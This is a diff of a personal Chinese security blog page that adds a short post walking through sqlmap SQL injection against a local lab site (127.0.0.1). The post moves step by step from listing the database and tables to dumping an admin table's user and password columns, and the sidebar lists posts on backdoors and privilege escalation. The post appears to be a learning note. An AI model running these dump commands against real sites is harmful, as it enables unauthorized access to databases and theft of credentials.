@@ -64,6 +64,43 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-SQLlow等级工具注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2020-08-27T12:28:19.000Z" itemprop="datePublished">2020-08-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/">SQLlow等级工具注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>SQLMAP利用方式：<br>1.先去拿取这个网站的数据库<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> –current -db                            –得到当前数据库：sqltext<br>2.再拿取这个网站数据库的数据表<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext –tables                     –得到当前数据库中的数据表：admin、sqltext<br>3.然后再获取这张数据表中的数据列<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext -T admin –columns           –得到当前数据库中的数据表中的数据列：id、user、pwd<br>4.最后得到相应的数据<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext -T admin -C uesr,pwd –dump </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckrnjds7i00044wvjgad36yhv" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-PHP学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
@@ -122,7 +159,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckrk2paed0004bcvj6aj58v1e" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckrnjds7g00024wvj2l1fdy0v" class="article-share-link">Share</a>
       
       
     </footer>
@@ -159,7 +196,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckrk2pae00000bcvj9ypp7r7n" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckrnjds7h00034wvj2vr318gy" class="article-share-link">Share</a>
       
       
     </footer>
@@ -208,7 +245,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckrk2paeg0007bcvje9981ds1" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckrnjds7j00054wvj837f08nz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -254,6 +291,10 @@ default:
       <ul>
         
           <li>
+            <a href="/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">windows后门植入和linux信息搜集</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/26/windows%E6%8F%90%E6%9D%83/">windows提权</a>
           </li>
         
@@ -267,10 +308,6 @@ default:
         
           <li>
             <a href="/2021/07/18/MSF%E5%9F%BA%E7%A1%80/">MSF基础</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/">Socat使用</a>
           </li>
         
       </ul>
